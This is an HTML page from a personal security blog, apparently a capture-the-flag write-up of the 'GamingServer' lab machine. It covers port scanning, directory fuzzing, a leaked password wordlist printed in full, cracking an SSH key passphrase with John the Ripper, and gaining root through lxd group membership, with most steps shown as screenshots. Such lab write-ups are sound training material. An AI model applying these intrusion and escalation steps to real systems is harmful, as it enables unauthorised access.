@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Creative - W4RSH3LL</title>
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../../../css/style.css" />
+    <link rel="stylesheet" href="../../../css/write_up.css" />
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../../../assets/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="../../../assets/favicon.svg" />
+    <link rel="shortcut icon" href="../../../assets/favicon.ico" />
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../assets/apple-touch-icon.png" />
+    <link rel="manifest" href="../../../assets/site.webmanifest" />
+</head>
+
+<body>
+
+    <!-- Background -->
+    <div class="background-overlay"></div>
+    <div class="particles"></div>
+
+    <!-- Navigation -->
+    <nav>
+        <div class="logo-container">
+            <img src="../../../assets/leviathan_profil_pic.jpg" alt="W4RSH3LL Avatar" class="avatar" />
+            <span class="logo-text">W4RSH3LL</span>
+            <button class="menu-toggle" aria-label="Toggle menu">&#9776;</button>
+        </div>
+
+        <ul class="menu">
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../../html/about.html">About</a></li>
+            <li><a href="../../../html/projects.html">Projects</a></li>
+            <li><a href="../../../html/certifications.html">Certifications</a></li>
+            <li><a href="../../../html/documentations.html">Documentations</a></li>
+            <li><a href="../../../html/write-ups.html" class="active">Write-ups</a></li>
+            <li><a href="../../../html/skills.html">Skills</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <main>
+        <section class="report-section">
+
+            <h1 class="section-title">Gaming Server - Write-up</h1>
+            <img src="../gamingServer/assets/logo.jpg">
+
+            <!-- Overview -->
+            <h2>Machine Overview</h2>
+            <ul>
+                <li><strong>Target IP:</strong> 10.10.105.241</li>
+                <li><strong>Title:</strong> GamingServer</li>
+                <li><strong>Difficulty:</strong> Easy</li>
+            </ul>
+            <hr>
+
+            <h2>Important Notes</h2>
+            <ul>
+                <li><strong>Apache Webserver Version:</strong>Apache httpd 2.4.29 ((Ubuntu))</li>
+                <li><strong>ID RSA Passphrase</strong> letmein</li>
+                <li><strong>User:</strong> john</li>
+                <li><strong>Privesc:</strong> Lxc</li>
+            </ul>
+            <hr>
+
+            <!-- Nmap -->
+            <h2>Nmap Port Scan</h2>
+
+            <h3>Scan #1</h3>
+            <pre><code>nmap 10.10.105.241</code></pre>
+            <pre><code>22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+            <h3>Scan #2</h3>
+            <pre><code>nmap -A 10.10.105.241</code></pre>
+            <pre><code>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)</code></pre>
+
+            <h3>Scan #3</h3>
+            <pre><code>nmap -p- 10.10.105.241</code></pre>
+            <pre><code>22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+            <hr>
+            <!-- Enumeration -->
+            <h2>Enumerating The Website</h2>
+
+            <figure>
+                <img src="../gamingServer/assets/Pasted image 20251114201201.png" alt="">
+            </figure>
+
+            <figure>
+                <img src="../gamingServer/assets/Pasted image 20250218112850.png" alt="">
+            </figure>
+
+            <h3>Directory Enumeration (ffuf)</h3>
+            <p>We will do some directory enumeration to look for any interesting directories or files.</p>
+
+            <pre><code>ffuf -u http://10.10.105.241:80/FUZZ \
+-w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
+-e .php,.txt,.rsa,.conf,.bak,.env,.json,.old,.ini \
+-fc 404,403</code></pre>
+            
+            <img src="../gamingServer/assets/Pasted image 20251114202621.png" alt="">
+            <p>Well we discovered plenty of interesting directories and files to explore.</p>
+
+            
+            <hr>
+
+            <h4>about.php</h4>
+            
+            <img src="../gamingServer/assets/Pasted image 20251114202318.png" alt="">
+            <p>We discovered a .php version of the about. Almost as if it was a beta or unfinished version of the page.</p>
+            <p>I noticed the upload file button becomes usuable and we can submit a file. I will keep this aside for the moment.</p>
+            
+            <hr>
+            <h4>robots.txt</h4>
+            <img src="../gamingServer/assets/Pasted image 20251114202746.png" alt="">
+
+            <hr>
+            <h4>uploads</h4>
+            <img src="../gamingServer/assets/Pasted image 20251114203054.png" alt="">
+            <p>After looking into the 3 files, only dict.lst was the interesting one. It held a password list:</p>
+            <pre><code>
+Spring2017
+Spring2016
+Spring2015
+Spring2014
+Spring2013
+spring2017
+spring2016
+spring2015
+spring2014
+spring2013
+Summer2017
+Summer2016
+Summer2015
+Summer2014
+Summer2013
+summer2017
+summer2016
+summer2015
+summer2014
+summer2013
+Autumn2017
+Autumn2016
+Autumn2015
+Autumn2014
+Autumn2013
+autumn2017
+autumn2016
+autumn2015
+autumn2014
+autumn2013
+Winter2017
+Winter2016
+Winter2015
+Winter2014
+Winter2013
+winter2017
+winter2016
+winter2015
+winter2014
+winter2013
+P@55w0rd
+P@ssw0rd!
+P@55w0rd!
+sqlsqlsqlsql
+SQLSQLSQLSQL
+Welcome123
+Welcome1234
+Welcome1212
+PassSql12
+network
+networking
+networks
+test
+testtest
+testing
+testing123
+testsql
+test-sql3
+sqlsqlsqlsqlsql
+bankbank
+default
+test
+testing
+password2
+password
+Password1
+Password1!
+P@ssw0rd
+password12
+Password12
+security
+security1
+security3
+secuirty3
+complex1
+complex2
+complex3
+sqlserver
+sql
+sqlsql
+password1
+password123
+complexpassword
+database
+server
+changeme
+change
+sqlserver2000
+sqlserver2005
+Sqlserver
+SqlServer
+Password1
+Password2
+P@ssw0rd
+P@ssw0rd!
+P@55w0rd!
+P@ssword!
+Password!
+password!
+sqlsvr
+sqlaccount
+account
+sasa
+sa
+administator
+pass
+sql
+microsoft
+sqlserver
+sa
+hugs
+sasa
+welcome
+welcome1
+welcome2
+march2011
+sqlpass
+sqlpassword
+guessme
+bird
+P@55w0rd!
+test
+dev
+devdev
+devdevdev
+qa
+god
+admin
+adminadmin
+admins
+goat
+sysadmin
+water
+dirt
+air
+earth
+company
+company1
+company123
+company1!
+company!
+secret
+secret!
+secret123
+secret1212
+secret12
+secret1!
+sqlpass123
+Summer2013
+Summer2012
+Summer2011
+Summer2010
+Summer2009
+Summer2008
+Winter2013
+Winter2012
+Winter2011
+Winter2010
+Winter2009
+Winter2008
+summer2013
+summer2012
+summer2011
+summer2010
+summer2009
+summer2008
+winter2013
+winter2012
+winter2011
+winter2010
+winter2009
+winter2008
+123456
+abcd123
+abc
+burp
+private
+unknown
+wicked
+alpine
+trust
+microsoft
+sql2000
+sql2003
+sql2005
+sql2008
+vista
+xp
+nt
+98
+95
+2003
+2008
+someday
+sql2010
+sql2011
+sql2009
+complex
+goat
+changelater
+rain
+fire
+snow
+unchanged
+qwerty
+12345678
+football
+baseball
+basketball
+abc123
+111111
+1qaz2wsx
+dragon
+master
+monkey
+letmein
+login
+princess
+solo
+qwertyuiop
+starwars
+            </code></pre>
+            <hr>
+            <h4>Secret</h4>
+            <img src="../gamingServer/assets/Pasted image 20251114202859.png" alt="">
+            <p>Well, here's an interesting file...</p>
+            
+            <hr>
+            <h4>Found RSA Key</h4>
+            <img src="../gamingServer/assets/Pasted image 20251114202952.png" alt="">
+            <p>I am going to save this Private RSA key aside</p>
+            
+            <hr>
+            <!-- Source -->
+            <h2>Inspecting Page Source</h2>
+            <p>Finally in the page source, inside of a comment we find a potential user called john.</p>
+            <img src="../gamingServer/assets/Pasted image 20251114214026.png" alt="">
+            <p>Found username: <strong>john</strong></p>
+
+            <hr>
+            <!-- Foothold -->
+            <h2>Gaining Foothold</h2>
+
+            <h3>Using the RSA Key</h3>
+            <p>Firstly, I will create a file that will contain the Private RSA key.</p>
+            <img src="../gamingServer/assets/Pasted image 20251114203745.png" alt="">
+            <p>And then we SSH into the server with username <strong>john</strong></p>
+            <img src="../gamingServer/assets/Pasted image 20251114203946.png" alt="">
+            <p>The server requires a passphrase for this RSA Key. We can attempt to crack it with John the Ripper and the wordlist we previously found.</p>
+
+            <hr>
+            <h3>Cracking Passphrase</h3>
+            <p>We first convert the the key into a hash file john can crack :</p>
+            <pre><code>ssh2john id_rsa > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash</code></pre>
+
+            <p>And then we crack it with John and the password list we previously found:</p>
+            <img src="../gamingServer/assets/Pasted image 20251114204657.png" alt="">
+            
+            <p>And we found the passphrase:</p>
+            <img src="../gamingServer/assets/Pasted image 20251114204712.png" alt="">
+            
+            <hr>
+            <h3>SSH Access</h3>
+            <p>Next, we SSH into the target server with the RSA key we found and the username and the passphrase for the key.</p>
+
+            <p>And we have an initial foothold!</p>
+            <img src="../gamingServer/assets/Pasted image 20251114214159.png" alt="">
+            <p>Here we retrieve the user flag.</p>
+            
+            <hr>
+            <!-- Privesc -->
+            <h2>Privilege Escalation</h2>
+            <p>Now that we have a stable SSH shell on the target server, I will begin by doing recon and looking for possible escalation vectors.</p>
+
+            <h3>Checking Crontab</h3>
+            <img src="../gamingServer/assets/Pasted image 20251114214448.png" alt="">
+            
+            <hr>
+            <h3>Groups</h3>
+            <img src="../gamingServer/assets/Pasted image 20251115135201.png" alt="">
+            
+
+            <p>It appears, that john is in the group lxd.</p>
+            <p>LXD is a lightweight container hypervisor which allows to run linux containers. If a member is part of the `lxd` group, it can escalate its privileges to user `root` irrespective of the fact that it has sudo permissions or not.</p>
+            <p>I found https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation?ref=infosecarticles.com guide related to `lxd` privilege escalation. We need to build an `alpine` image and then we can mount the `/root` directory of  the target machine to the `/mnt` directory of a `lxd` container. </p>
+            <p>First we need to build the image in our own machine:</p>
+
+            <hr>
+            <h3>Building Alpine</h3>
+            <pre><code>git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+./build-alpine</code></pre>
+
+            <p>After building the image, we need to move it to our /home on our attacking machine.</p>
+            <img src="../gamingServer/assets/Pasted image 20251115135648.png" alt="">
+            
+            <hr>
+            <h3>Importing Image</h3>
+            <p>Next we need to copy the compressed file to the target machine and then import the image using `lxc`.</p>
+            <img src="../gamingServer/assets/Pasted image 20251115140415.png" alt="">
+            
+            <hr>
+            <h3>Start Lxd and configure storage pool:</h3>
+            <p>Before running the image, start and configure the lxd storage pool as default</p>
+            <img src="../gamingServer/assets/Pasted image 20251115140457.png" atl="">
+
+            <hr>
+            <h3>Mounting /root</h3>
+            <img src="../gamingServer/assets/Pasted image 20251115140546.png" alt="">
+            
+            <hr>
+            <h3>Root Flag</h3>
+            <p>Our container has been created. Now we can simply start the container and read our final flag in the `/mnt/root/root` directory!</p>
+            <img src="../gamingServer/assets/Pasted image 20251115140647.png" alt="">
+
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="footer-container">
+            <p>&copy; 2025 W4RSH3LL. All rights reserved.</p>
+
+            <div class="footer-links">
+
+                <!-- Email -->
+                <a href="mailto:w4rsh3ll@pm.me" class="footer-link" title="Email">
+                    <svg class="footer-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 
+                        1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 
+                        2-2zm0 2v.01L12 13l8-6.99V6H4zm0 
+                        12h16V8l-8 6-8-6v10z"/>
+                    </svg>
+                    <span>w4rsh3ll@pm.me</span>
+                </a>
+
+                <!-- GitHub -->
+                <a href="https://github.com/w4rsh3ll" target="_blank" class="footer-link" title="GitHub">
+                    <svg class="footer-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 0C5.37 0 0 5.37 0 
+                        12c0 5.3 3.438 9.8 8.205 
+                        11.387.6.113.82-.26.82-.577v-2.256c-3.338.726-4.033-1.61-4.033-1.61-.546-1.387-1.333-1.757-1.333-1.757-1.09-.745.083-.729.083-.729 
+                        1.205.085 1.84 1.236 1.84 
+                        1.236 1.07 1.834 2.807 1.304 
+                        3.492.997.108-.775.418-1.304.762-1.604-2.665-.304-5.466-1.332-5.466-5.93 
+                        0-1.31.467-2.38 1.235-3.22-.123-.303-.535-1.523.117-3.176 
+                        0 0 1.008-.322 3.301 1.23a11.52 
+                        11.52 0 0 1 3.003-.404c1.02.005 
+                        2.047.138 3.004.404 2.291-1.552 
+                        3.297-1.23 3.297-1.23.655 1.653.243 
+                        2.873.12 3.176.77.84 1.232 
+                        1.91 1.232 3.22 0 4.61-2.807 
+                        5.624-5.48 5.922.43.37.823 1.102.823 
+                        2.222v3.293c0 .32.217.694.825.576A12.01 
+                        12.01 0 0 0 24 12c0-6.63-5.37-12-12-12z"/>
+                    </svg>
+                    <span>github.com/w4rsh3ll</span>
+                </a>
+
+                <!-- TryHackMe -->
+                <a href="https://tryhackme.com/p/W4RSH3LL" target="_blank" class="footer-link" title="TryHackMe">
+                    <svg class="footer-icon" viewBox="0 0 46.069 46.069" fill="currentColor">
+                        <g>…</g>
+                    </svg>
+                    <span>tryhackme.com/W4RSH3LL</span>
+                </a>
+
+            </div>
+        </div>
+    </footer>
+    <script src="../../../js/script.js"></script>
+</body>
+</html>
